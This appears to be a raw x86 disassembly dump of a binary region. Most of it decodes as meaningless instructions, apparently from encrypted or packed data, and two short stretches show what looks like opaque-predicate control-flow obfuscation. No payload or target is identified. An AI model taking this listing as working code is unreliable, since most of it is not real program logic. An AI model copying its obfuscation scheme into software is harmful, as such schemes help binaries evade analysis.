  40b9e7:	inc    edi
  40b9e8:	inc    esp
  40b9e9:	mov    ebx,0x87833c1d
  40b9ee:	push   es
  40b9ef:	pop    ecx
  40b9f0:	and    eax,0x8c52e8a2
  40b9f5:	(bad)  
  40b9f7:	pop    esp
  40b9f8:	out    0x46,eax
  40b9fa:	mov    DWORD PTR [ecx+0x1d583c7c],ebx
  40ba00:	dec    eax
  40ba01:	mov    dl,0x64
  40ba03:	lock pusha 
  40ba05:	test   BYTE PTR [ebp+0x6500f85c],cl
  40ba0b:	cmp    BYTE PTR [ebp+0x370c3a5a],dh
  40ba11:	cli    
  40ba12:	retf   0x2bdd
  40ba15:	add    BYTE PTR [ebx],al
  40ba17:	inc    DWORD PTR [esi]
  40ba19:	push   0x4d0ca414
  40ba1e:	push   edi
  40ba1f:	and    BYTE PTR [ecx],dh
  40ba21:	inc    eax
  40ba22:	inc    esp
  40ba23:	sub    DWORD PTR [ebx],eax
  40ba25:	rol    DWORD PTR [ecx+ebx*1],0xb6
  40ba29:	jle    0x40ba81
  40ba2b:	jb     0x40b9c0
  40ba2d:	push   cs
  40ba2e:	(bad)  
  40ba30:	push   ss
  40ba31:	arpl   WORD PTR [edi-0x1eabbc6f],di
  40ba37:	test   eax,0x87dc2728
  40ba3c:	call   0x2c50:0x991facb7
  40ba43:	cli    
  40ba44:	adc    edi,eax
  40ba46:	aaa    
  40ba47:	shl    DWORD PTR [edi-0x7],1
  40ba4a:	iret   
  40ba4b:	xor    al,0x27
  40ba4d:	sub    eax,0xc1fdb527
  40ba52:	push   ss
  40ba53:	xlat   BYTE PTR ds:[ebx]
  40ba54:	jmp    0x632b39e8
  40ba59:	and    bl,bl
  40ba5b:	inc    esp
  40ba5c:	xchg   esp,eax
  40ba5d:	inc    edi
  40ba5e:	adc    eax,0xab987d59
  40ba63:	jb     0x40ba63
  40ba65:	test   eax,0xb3a42435
  40ba6a:	jno    0x40ba89
  40ba6c:	rol    ebx,1
  40ba6e:	fistp  DWORD PTR [ebp-0x68]
  40ba71:	int    0x34
  40ba73:	shl    DWORD PTR [ebx*4-0xc9fe080],1
  40ba7a:	jo     0x40bacb
  40ba7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7d:	retf   0xf554
  40ba80:	in     eax,0x5d
  40ba82:	arpl   WORD PTR [ebx-0x50],cx
  40ba85:	call   0xf3126267
  40ba8a:	retf   0xe929
  40ba8d:	dec    edi
  40ba8e:	es mov ebp,0x151d6e82
  40ba94:	mov    al,0x57
  40ba96:	pop    edx
  40ba97:	repnz aam 0xcc
  40ba9a:	in     al,dx
  40ba9b:	cmp    BYTE PTR [edi+0x304d506c],ch
  40baa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa2:	repz and BYTE PTR [edi-0x25769c3a],ch
  40baa9:	sbb    ebx,DWORD PTR [edx+0x4b0d08d5]
  40baaf:	das    
  40bab0:	bound  ebx,QWORD PTR [edi+0x36]
  40bab3:	ror    dh,cl
  40bab5:	push   0x3b
  40bab7:	xor    cl,BYTE PTR [ebx+0xa3f9310]
  40babd:	push   edi
  40babe:	sbb    eax,edx
  40bac0:	sbb    eax,DWORD PTR [ecx+0x115034cf]
  40bac6:	pushfw 
  40bac8:	popf   
  40bac9:	dec    eax
  40baca:	or     esp,DWORD PTR [edi-0x3b]
  40bacd:	rcl    bh,cl
  40bacf:	mov    WORD PTR [edi-0x20e7bb13],gs
  40bad5:	sbb    eax,0x4dff1ca5
  40bada:	inc    edx
  40badb:	or     DWORD PTR [esi-0x51b428d2],ebx
  40bae1:	lods   al,BYTE PTR ds:[esi]
  40bae2:	cmp    BYTE PTR [ebp-0x72389c51],0x6e
  40bae9:	mov    bh,0x49
  40baeb:	push   0xa374716d
  40baf0:	xchg   ebx,eax
  40baf1:	ret    
  40baf2:	out    dx,al
  40baf3:	into   
  40baf4:	lock add al,0x7
  40baf7:	xor    al,0x5b
  40baf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bafa:	fcomip st,st(6)
  40bafc:	mov    WORD PTR [edx-0x66],ds
  40baff:	push   esp
  40bb00:	rcl    BYTE PTR [ecx],0xcd
  40bb03:	lods   eax,DWORD PTR ds:[esi]
  40bb04:	bound  ecx,QWORD PTR [esi-0x1f]
  40bb07:	mov    al,ds:0xfcf1d1b6
  40bb0c:	ror    DWORD PTR [edx-0x7e],cl
  40bb0f:	call   0x62822563
  40bb14:	sub    al,0x69
  40bb17:	jne    0x40bb1c
  40bb19:	ds retf 
  40bb1b:	into   
  40bb1c:	(bad)  
  40bb1d:	and    ebp,ebp
  40bb1f:	nop
  40bb20:	pop    ss
  40bb21:	jle    0x40bb9c
  40bb23:	mov    ecx,0xc1c26bf
  40bb28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb29:	loopne 0x40bb71
  40bb2b:	cwde   
  40bb2c:	lock fisub DWORD PTR [edi*1-0x7f3e8870]
  40bb34:	cmp    edi,ebp
  40bb36:	stos   BYTE PTR es:[edi],al
  40bb37:	retf   
  40bb38:	mov    ebp,0xadc8de34
  40bb3d:	fcmovbe st,st(4)
  40bb3f:	or     al,0xff
  40bb41:	ins    DWORD PTR es:[edi],dx
  40bb42:	dec    edx
  40bb43:	mov    ebx,0xdecbfb31
  40bb48:	out    dx,eax
  40bb49:	mov    bh,0xc3
  40bb4b:	or     eax,0x4847e6aa
  40bb50:	lds    esp,FWORD PTR [eax-0x79]
  40bb53:	nop
  40bb54:	stos   DWORD PTR es:[edi],eax
  40bb55:	sbb    ch,bh
  40bb57:	leave  
  40bb58:	out    0xa1,al
  40bb5a:	sbb    ebx,ecx
  40bb5c:	xchg   edi,eax
  40bb5d:	sub    ecx,DWORD PTR [edx-0x574d05f5]
  40bb63:	and    al,0xfb
  40bb65:	pusha  
  40bb66:	inc    eax
  40bb67:	mov    ds:0xe114965c,eax
  40bb6c:	stos   BYTE PTR es:[edi],al
  40bb6d:	xchg   esi,eax
  40bb6e:	sub    BYTE PTR [ebx-0x1d],ah
  40bb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb72:	sub    eax,0x53a27a59
  40bb77:	mov    ebp,0xa87a2b74
  40bb7c:	scas   eax,DWORD PTR es:[edi]
  40bb7d:	inc    edi
  40bb7e:	xor    al,0x47
  40bb80:	mov    ds:0xb574358b,al
  40bb85:	cmp    edx,esp
  40bb87:	fcmovu st,st(1)
  40bb89:	mov    fs,WORD PTR [ebp-0x59]
  40bb8c:	sub    BYTE PTR [ebx-0x20],0x57
  40bb90:	out    dx,eax
  40bb91:	or     esp,DWORD PTR ds:0x27bc3f7e
  40bb97:	push   edi
  40bb98:	dec    edi
  40bb99:	data16 cli 
  40bb9b:	sbb    esp,edi
  40bb9d:	add    BYTE PTR [ecx-0x7d],ah
  40bba0:	scas   eax,DWORD PTR es:[edi]
  40bba1:	xchg   ebp,eax
  40bba2:	sbb    al,BYTE PTR [eax-0x33f2ff28]
  40bba8:	add    eax,0xe9c65d70
  40bbad:	test   BYTE PTR [ebx+0x5148ad3d],cl
  40bbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb4:	aas    
  40bbb5:	pop    ss
  40bbb6:	(bad)  
  40bbb7:	xor    eax,0xff6ac53b
  40bbbc:	mov    al,0x65
  40bbbe:	pop    ebx
  40bbbf:	xor    BYTE PTR [ebp+0x20272ba],dh
  40bbc5:	adc    cl,ah
  40bbc7:	mov    al,al
  40bbc9:	fwait
  40bbca:	mov    esi,0xa3fa2af0
  40bbcf:	mov    ah,0xcb
  40bbd1:	xor    DWORD PTR [ebp+0xa06d104],ebp
  40bbd7:	xor    eax,0x9b1bda38
  40bbdc:	ds aas 
  40bbde:	mov    bh,0x9f
  40bbe0:	adc    eax,0xdee0a435
  40bbe5:	mov    ds:0xf50129ab,eax
  40bbea:	arpl   WORD PTR [eax],si
  40bbec:	and    BYTE PTR ds:0x89c92fa2,ch
  40bbf2:	out    0x84,al
  40bbf4:	iret   
  40bbf5:	je     0x40bba4
  40bbf7:	or     al,0x9d
  40bbf9:	push   0xd5ec21f0
  40bbfe:	ror    dh,1
  40bc00:	enter  0x2d62,0xfa
  40bc04:	cmp    al,0x6b
  40bc06:	sbb    eax,0xbc4d477c
  40bc0b:	and    eax,DWORD PTR [edi-0x31]
  40bc0e:	cmp    al,BYTE PTR [edi+0x4b]
  40bc11:	(bad)  
  40bc12:	fcmove st,st(5)
  40bc14:	lock sbb ebp,DWORD PTR [eax-0x342726f6]
  40bc1b:	jne    0x40bc03
  40bc1d:	daa    
  40bc1e:	iret   
  40bc1f:	rcr    DWORD PTR [ebx+ebp*2],1
  40bc22:	(bad)  
  40bc23:	ja     0x40bbf2
  40bc25:	fs retf 
  40bc27:	adc    DWORD PTR [edi],edi
  40bc29:	sbb    BYTE PTR [ebx],ah
  40bc2b:	outs   dx,DWORD PTR ds:[esi]
  40bc2c:	loope  0x40bc6a
  40bc2e:	push   edx
  40bc2f:	popa   
  40bc30:	jmp    0xdb1f:0x1b10c1a1
  40bc37:	adc    BYTE PTR [eax-0x6cfe6aae],bh
  40bc3d:	scas   al,BYTE PTR es:[edi]
  40bc3e:	es add esi,esi
  40bc41:	sbb    DWORD PTR [esi],0xd088b455
  40bc47:	es jmp 0xa3f48fd5
  40bc4d:	fsubrp st(2),st
  40bc4f:	adc    eax,0x874fbd5b
  40bc54:	and    ebx,esp
  40bc56:	retf   
  40bc57:	push   ss
  40bc58:	rcr    BYTE PTR [edi-0x57836dcf],1
  40bc5e:	int    0x98
  40bc60:	int3   
  40bc61:	xor    eax,0x40b9db1e
  40bc66:	and    BYTE PTR [edx],al
  40bc68:	cmp    eax,0x5df4418a
  40bc6d:	ja     0x40bc73
  40bc6f:	in     eax,0xd9
  40bc71:	cmp    cl,bl
  40bc73:	pushf  
  40bc74:	fcomp  DWORD PTR [ecx]
  40bc76:	xor    BYTE PTR ds:0xbabc7359,0x33
  40bc7d:	in     al,dx
  40bc7e:	inc    esi
  40bc7f:	sub    DWORD PTR [ebx-0x4f278639],ebx
  40bc85:	adc    dl,bh
  40bc87:	dec    ebp
  40bc88:	(bad)  
  40bc89:	pop    ds
  40bc8a:	lods   eax,DWORD PTR ds:[esi]
  40bc8b:	add    edi,DWORD PTR [ebx+0x31]
  40bc8e:	sbb    DWORD PTR [ebx+eiz*4],ebp
  40bc91:	lods   al,BYTE PTR ds:[esi]
  40bc92:	mov    bl,0x9b
  40bc94:	outs   dx,DWORD PTR ss:[esi]
  40bc96:	pop    edx
  40bc97:	and    DWORD PTR [ecx],edi
  40bc99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc9a:	or     BYTE PTR [ecx+0x19],ah
  40bc9d:	pop    edi
  40bc9e:	icebp  
  40bc9f:	xchg   ecx,eax
  40bca0:	dec    eax
  40bca1:	sub    eax,0x50314342
  40bca6:	mov    al,ds:0x3ebeaaf1
  40bcab:	mov    ebp,0x7434895c
  40bcb0:	fidiv  WORD PTR [edx+0x3bec9305]
  40bcb6:	(bad)  
  40bcb7:	xchg   esi,eax
  40bcb8:	xchg   ecx,eax
  40bcb9:	mov    WORD PTR [ebp+0x43],es
  40bcbc:	outs   dx,BYTE PTR ds:[esi]
  40bcbd:	push   edx
  40bcbe:	imul   ecx,DWORD PTR [ecx-0x7e],0x94accdef
  40bcc5:	repz sub BYTE PTR [ebp+0x52],bh
  40bcc9:	enter  0x91b1,0x72
  40bccd:	test   DWORD PTR [ebp+eax*1-0x2f],0x87a23826
  40bcd5:	nop
  40bcd6:	mov    WORD PTR [ebx+ecx*4-0x7d7874cd],fs
  40bcdd:	stos   BYTE PTR es:[edi],al
  40bcde:	mov    dh,0x98
  40bce0:	push   eax
  40bce1:	popf   
  40bce2:	clc    
  40bce3:	imul   ebx,DWORD PTR [ecx+0x6],0xc840c2d8
  40bcea:	jmp    0x40d4985
  40bcef:	adc    DWORD PTR [ecx+0x5e],edi
  40bcf2:	add    al,0x7c
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    bl,BYTE PTR [eax]
  40bd3f:	xchg   ecx,eax
  40bd40:	lods   eax,DWORD PTR ds:[esi]
  40bd41:	ror    BYTE PTR [edi-0x608f8f71],1
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd2b
  40bd4b:	inc    ecx
  40bd4c:	mov    dl,0x79
  40bd4e:	scas   al,BYTE PTR es:[edi]
  40bd4f:	(bad)  
  40bd50:	push   0xbd22ec65
  40bd55:	inc    edi
  40bd56:	stc    
  40bd57:	dec    edx
  40bd58:	mov    edi,0x387b8ff9
  40bd5d:	cdq    
  40bd5e:	xchg   esp,eax
  40bd5f:	jne    0x40bd78
  40bd61:	mov    ebp,0xcb349cb6
  40bd66:	push   edx
  40bd67:	pop    esp
  40bd68:	add    eax,0x5150d16
  40bd6d:	dec    ebx
  40bd6e:	jo     0x40bdeb
  40bd70:	jno    0x40bd42
  40bd72:	sbb    eax,0x482a485b
  40bd77:	cmp    edi,DWORD PTR [ebx]
  40bd79:	push   0x67
  40bd7b:	xor    eax,DWORD PTR [ebx+0x27]
  40bd7e:	mov    ebp,0xb1d0f901
  40bd83:	mov    ebx,0xdae13e24
  40bd88:	icebp  
  40bd89:	xchg   DWORD PTR [edi+0x31],ebp
  40bd8c:	jg     0x40bd82
  40bd8e:	in     al,0xb7
  40bd90:	daa    
  40bd91:	clc    
  40bd92:	es fst st(6)
  40bd95:	iret   
  40bd96:	mov    bh,0x6b
  40bd98:	repz dec DWORD PTR [ecx-0x78b46b98]
  40bd9f:	test   al,0x68
  40bda1:	retf   
  40bda2:	test   DWORD PTR [eax+0xb],ebp
  40bda5:	dec    ebp
  40bda6:	mov    bh,0x9a
  40bda8:	ss repnz cs into 
  40bdac:	retf   
  40bdad:	loopne 0x40bd72
  40bdaf:	and    al,0xf0
  40bdb1:	xlat   BYTE PTR ds:[ebx]
  40bdb2:	adc    al,0x7c
  40bdb4:	mov    al,ds:0x688f3518
  40bdb9:	ret    
  40bdba:	sub    DWORD PTR [esi+ebp*2],eax
  40bdbd:	loop   0x40be10
  40bdbf:	(bad)  
  40bdc1:	add    DWORD PTR [edi],edi
  40bdc3:	or     al,0x5b
  40bdc5:	js     0x40bd80
  40bdc7:	push   ss
  40bdc8:	inc    BYTE PTR [ecx-0x77]
  40bdcb:	pop    esp
  40bdcc:	rcr    esi,1
  40bdce:	pop    es
  40bdcf:	out    dx,eax
  40bdd0:	jnp    0x40bd60
  40bdd2:	sysret 
  40bdd4:	lods   eax,DWORD PTR ds:[esi]
  40bdd5:	jmp    0x6f1d:0x3b1c3597
  40bddc:	test   al,0x8b
  40bdde:	add    eax,0x3d71d6e6
  40bde3:	in     eax,dx
  40bde4:	cmp    eax,0xf768a599
  40bde9:	mov    ecx,0xbe453dd4
  40bdee:	sbb    al,BYTE PTR [ecx]
  40bdf0:	ja     0x40bd87
  40bdf2:	lods   eax,DWORD PTR ds:[esi]
  40bdf3:	or     DWORD PTR [edx],0x6b
  40bdf6:	dec    ebp
  40bdf7:	int3   
  40bdf8:	sbb    DWORD PTR [edi-0x7a],ecx
  40bdfb:	(bad)  
  40bdfc:	adc    BYTE PTR [ebp+0x370acb24],dl
  40be02:	dec    edi
  40be03:	or     ch,BYTE PTR [esi-0x5a]
  40be06:	int3   
  40be07:	xor    eax,0x29e86444
  40be0c:	push   0x2413c1db
  40be11:	push   ebx
  40be12:	outs   dx,BYTE PTR ds:[esi]
  40be13:	mov    bl,0xd1
  40be15:	mov    edi,0x51ab2caa
  40be1a:	jne    0x40be04
  40be1c:	pop    esp
  40be1d:	and    esi,DWORD PTR [edi+esi*4+0x71]
  40be21:	mov    ebp,0xa4514c7e
  40be26:	daa    
  40be27:	or     edi,esi
  40be29:	ffree  st(0)
  40be2b:	pop    ecx
  40be2c:	in     al,0xc5
  40be2e:	sti    
  40be2f:	mov    cl,BYTE PTR [eax]
  40be31:	ja     0x40beaa
  40be33:	cmp    bh,ah
  40be35:	ror    bl,0x3
  40be38:	pop    ax
  40be3a:	and    dl,dl
  40be3c:	repnz sti 
  40be3e:	sub    DWORD PTR [ecx-0x3a3bc3ab],eax
  40be44:	jmp    0x40be1d
  40be46:	and    al,0xfa
  40be48:	sahf   
  40be49:	pushw  cs
  40be4b:	dec    ecx
  40be4c:	cdq    
  40be4d:	ja     0x40be71
  40be4f:	(bad)
  40be52:	inc    ebp
  40be53:	nop
  40be54:	lahf   
  40be55:	test   DWORD PTR [ebx+0x34],0xab3e74e4
  40be5c:	push   es
  40be5d:	fadd   st,st(5)
  40be5f:	iret   
  40be60:	aam    0x2f
  40be62:	dec    edx
  40be63:	jl     0x40be38
  40be65:	jmp    0x47d64731
  40be6a:	dec    esp
  40be6b:	inc    ebx
  40be6c:	xor    esi,DWORD PTR [ecx+eiz*1-0x73]
  40be70:	outs   dx,DWORD PTR ds:[esi]
  40be71:	and    edi,eax
  40be73:	iret   
  40be74:	dec    esi
  40be75:	sbb    eax,0xe38d2b8f
  40be7a:	cdq    
  40be7b:	adc    al,0xc7
  40be7d:	jbe    0x40beb1
  40be7f:	cs add ecx,ebx
  40be82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be83:	or     al,0xa1
  40be85:	xchg   edi,eax
  40be86:	or     cl,BYTE PTR [ebx]
  40be88:	(bad)  
  40be89:	and    DWORD PTR [esi-0x24],eax
  40be8c:	sbb    ebx,DWORD PTR [eax-0x2fa97c0c]
  40be92:	xor    al,0x16
  40be94:	es add eax,0xb7f08714
  40be9a:	call   FWORD PTR [bp+di-0x7f]
  40be9e:	xchg   DWORD PTR [eax-0x102fa876],ebp
  40bea4:	cmp    ecx,DWORD PTR [eax+0x2a]
  40bea7:	call   FWORD PTR [esi+0x22b110c0]
  40bead:	cmp    al,0x92
  40beaf:	arpl   WORD PTR ds:0x38c45fe1,sp
  40beb5:	mov    edi,DWORD PTR [eax-0x2f8766c3]
  40bebb:	cmp    al,0x47
  40bebd:	and    al,0xf8
  40bebf:	and    DWORD PTR [esi+0x28],ebp
  40bec2:	out    0xc9,eax
  40bec4:	cmp    eax,0x9da5dade
  40bec9:	and    dh,BYTE PTR [ecx]
  40becb:	jbe    0x40bf18
  40becd:	rol    BYTE PTR [ebp-0x5f661ed8],0x48
  40bed4:	call   0x3cb08477
  40bed9:	daa    
  40beda:	(bad)  
  40bedd:	(bad)  
  40bedf:	push   ds
  40bee0:	dec    ebp
  40bee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee2:	sbb    eax,0x8fc08de2
  40bee7:	rcr    BYTE PTR [ebx+ecx*4-0x5c9f2ced],1
  40beee:	cmp    edi,DWORD PTR [edi]
  40bef0:	ror    DWORD PTR [eax-0x37],0x45
  40bef4:	(bad)  
  40bef5:	pop    ecx
  40bef6:	das    
  40bef7:	out    dx,al
  40bef8:	mov    dh,0x47
  40befa:	xchg   ebp,eax
  40befb:	inc    ebx
  40befc:	idiv   DWORD PTR [eax-0x49]
  40beff:	lock sbb bl,BYTE PTR [edi+0x4c81e4e1]
  40bf06:	neg    BYTE PTR [esi+0x65]
  40bf09:	(bad)  
  40bf0a:	test   eax,0x49fc7184
  40bf0f:	jbe    0x40bec2
  40bf11:	mov    dh,0x3d
  40bf13:	repnz xor eax,0xaf977f76
  40bf19:	adc    eax,0xb4283c74
  40bf1e:	sbb    cl,dl
  40bf20:	pop    ss
  40bf21:	mov    bh,0x3f
  40bf23:	mov    dl,al
  40bf25:	push   ebp
  40bf26:	pop    ss
  40bf27:	lods   al,BYTE PTR ds:[esi]
  40bf28:	bound  ebp,QWORD PTR [ebx+0x116539c8]
  40bf2e:	xor    ecx,DWORD PTR [ebp+0x51b8cc92]
  40bf34:	rol    esp,1
  40bf36:	adc    eax,0x163a9127
  40bf3b:	int3   
  40bf3c:	fsub   DWORD PTR [edi+0x73389524]
  40bf42:	(bad)  
  40bf43:	int3   
  40bf44:	mov    esi,0xda7837e
  40bf49:	jne    0x40bfb6
  40bf4b:	jae    0x40bf6d
  40bf4d:	imul   esi,DWORD PTR [ebp+0x6d],0xebd6d9c
  40bf54:	iret   
  40bf55:	loopne 0x40bf4f
  40bf57:	xor    esi,esp
  40bf59:	xchg   edi,eax
  40bf5a:	push   eax
  40bf5b:	loope  0x40bfab
  40bf5d:	push   edi
  40bf5e:	and    al,0x5c
  40bf60:	sub    DWORD PTR [ecx-0x776849ae],edi
  40bf66:	scas   eax,DWORD PTR es:[edi]
  40bf67:	(bad)  
  40bf68:	sub    BYTE PTR ds:[eax-0x4aa86ad0],cl
  40bf6f:	xchg   esi,ecx
  40bf71:	clc    
  40bf72:	call   0xcde1:0xb543ad5f
  40bf79:	mov    dh,0x6e
  40bf7b:	fdivr  DWORD PTR [eiz*4-0x24458bf7]
  40bf82:	lods   al,BYTE PTR ds:[esi]
  40bf83:	pop    es
  40bf84:	into   
  40bf85:	mov    ds:0x534c7f0c,eax
  40bf8a:	retf   
  40bf8b:	pop    edi
  40bf8c:	and    dh,BYTE PTR [ebp-0x65]
  40bf8f:	leave  
  40bf90:	or     ebx,DWORD PTR [edi]
  40bf92:	mov    ?,WORD PTR [eax-0x3f]
  40bf95:	sub    BYTE PTR [ebp+0x357b9242],cl
  40bf9b:	int    0x40
  40bf9d:	fs mov dh,0x7a
  40bfa0:	(bad)
  40bfa3:	cmp    DWORD PTR [ebx+ecx*8],0xf2688e44
  40bfaa:	mov    DWORD PTR ds:0xdaded86,eax
  40bfb0:	sahf   
  40bfb1:	in     al,0x8c
  40bfb3:	add    DWORD PTR [ecx-0x6b],esp
  40bfb6:	add    esp,0xb3977672
  40bfbc:	inc    edi
  40bfbd:	cmp    eax,DWORD PTR [ecx]
  40bfbf:	dec    ebp
  40bfc0:	mov    al,ds:0xbec3e8
  40bfc5:	jl     0x40bfce
  40bfc7:	int3   
  40bfc8:	add    eax,0x6af2d769
  40bfcd:	jg     0x40bf70
  40bfcf:	stos   BYTE PTR es:[edi],al
  40bfd0:	pushf  
  40bfd1:	jb     0x40bff3
  40bfd3:	imul   ebx,DWORD PTR ds:0xce705890,0x815374c2
  40bfdd:	aaa    
  40bfde:	aad    0xca
  40bfe0:	or     edx,ecx
  40bfe2:	int3   
  40bfe3:	cld    
  40bfe4:	adc    edx,ebx
  40bfe6:	pop    eax
  40bfe7:	inc    ebp
  40bfe8:	loopne 0x40bfa8
  40bfea:	aas    
  40bfeb:	lock jmp WORD PTR [bp+si]
  40bff0:	and    eax,0xdd5c2d45
  40bff5:	inc    eax
  40bff6:	and    esp,0x68d1a15e
  40bffc:	and    dl,BYTE PTR [edi+0xc]
  40bfff:	jne    0x40c030
  40c001:	xchg   ebp,eax
  40c002:	ret    0x904c
  40c005:	enter  0x7827,0x84
  40c009:	sbb    esp,DWORD PTR [edi+0x58eff67d]
  40c00f:	or     bh,BYTE PTR [ecx+0x71]
  40c012:	in     eax,0xaa
  40c014:	xor    eax,0xff736ca
  40c019:	jg     0x40bfa6
  40c01b:	int3   
  40c01c:	imul   edi,DWORD PTR [edx],0xffffff84
  40c01f:	and    eax,0xb91e366b
  40c024:	aad    0x3
  40c026:	arpl   WORD PTR [ebp-0x2b6d47a8],di
  40c02c:	jnp    0x40bfca
  40c02e:	or     BYTE PTR [edi],dh
  40c030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c031:	cmp    edx,DWORD PTR [ecx-0x7654b041]
  40c037:	aad    0x23
  40c039:	pop    esi
  40c03a:	gs push ds
  40c03c:	cwde   
  40c03d:	cmp    BYTE PTR [edx-0x7d],0xa2
  40c041:	or     cl,al
  40c043:	inc    esp
  40c044:	jae    0x40c087
  40c046:	jmp    0xd5b4:0xfc4a93ef
  40c04d:	out    dx,al
  40c04e:	ds loop 0x40c052
  40c051:	(bad)  [ecx-0x6618ae8c]
  40c057:	sub    bh,dl
  40c059:	inc    ebx
  40c05a:	push   ebp
  40c05b:	cli    
  40c05c:	in     eax,0xac
  40c05e:	leave  
  40c05f:	push   cs
  40c060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c061:	sub    esi,DWORD PTR [esp+edx*4-0x5111b5eb]
  40c068:	jge    0x40c03e
  40c06a:	lods   al,BYTE PTR ds:[esi]
  40c06b:	adc    BYTE PTR [edx-0x16],0xe4
  40c06f:	adc    eax,0xc4dcf639
  40c074:	or     DWORD PTR [edx],eax
  40c076:	sbb    al,0xc9
  40c078:	jmp    0x40c00f
  40c07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07b:	and    DWORD PTR [ebx+0x24],eax
  40c07e:	stc    
  40c07f:	loopne 0x40c02c
  40c081:	out    0xed,eax
  40c083:	inc    ecx
  40c084:	add    esi,eax
  40c086:	(bad)  
  40c087:	nop
  40c088:	sub    DWORD PTR [edx],0x32
  40c08b:	jge    0x40c0f5
  40c08d:	pushf  
  40c08e:	dec    ebx
  40c08f:	pop    esp
  40c090:	sub    al,0x72
  40c092:	sar    DWORD PTR es:[esp+eax*1+0x438e4ccb],0xd2
  40c09b:	dec    ebp
  40c09c:	jecxz  0x40c0d7
  40c09e:	mov    dl,0x91
  40c0a0:	pop    ebp
  40c0a1:	mov    cl,0x6c
  40c0a3:	adc    eax,0x46922f55
  40c0a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0a9:	xor    eax,0x66e52fa0
  40c0ae:	pushf  
  40c0af:	ficom  WORD PTR [eax+0x6]
  40c0b2:	push   ss
  40c0b3:	neg    DWORD PTR [edi+ebp*8-0x76]
  40c0b7:	inc    edx
  40c0b8:	adc    cl,BYTE PTR [edi+0x31]
  40c0bb:	lods   eax,DWORD PTR ds:[esi]
  40c0bc:	cld    
  40c0bd:	inc    esp
  40c0be:	int    0xe4
  40c0c0:	out    dx,al
  40c0c1:	or     BYTE PTR [ebp+0x368ad20d],0xab
  40c0c8:	push   0x93e86fbd
  40c0cd:	scas   al,BYTE PTR es:[edi]
  40c0ce:	jp     0x40c0d7
  40c0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d1:	push   eax
  40c0d2:	lds    eax,FWORD PTR [edi-0x32]
  40c0d5:	pop    DWORD PTR [edx]
  40c0d7:	aam    0x6a
  40c0d9:	add    bl,ch
  40c0db:	mov    al,0x93
  40c0dd:	xor    edx,esp
  40c0df:	lods   al,BYTE PTR ds:[esi]
  40c0e0:	mov    dl,0x7f
  40c0e2:	inc    esi
  40c0e3:	inc    edx
  40c0e4:	cmp    esp,eax
  40c0e6:	inc    eax
  40c0e7:	push   0x8b47da20
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov dx,sp
  40c144:	or     al,0xe3
  40c146:	mov    esi,0x70708b2e
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c120
  40c150:	push   edi
  40c151:	gs cmp eax,0x1f621935
  40c157:	jbe    0x40c122
  40c159:	pop    ebx
  40c15a:	mov    ah,BYTE PTR [edi]
  40c15c:	fsub   st,st(1)
  40c15e:	sub    DWORD PTR ds:0xdade21ca,ecx
  40c164:	test   eax,0x49e3d74f
  40c169:	sbb    esp,DWORD PTR [eax+0x2c]
  40c16c:	inc    esp
  40c16d:	pop    eax
  40c16e:	sbb    DWORD PTR [ebp+0x1ae82b18],0xb3b88b24
  40c178:	jmp    0x148e:0x87f6e439
  40c17f:	cld    
  40c180:	and    eax,0xd7711632
  40c185:	cwde   
  40c186:	push   ebx
  40c187:	repnz xor edi,ecx
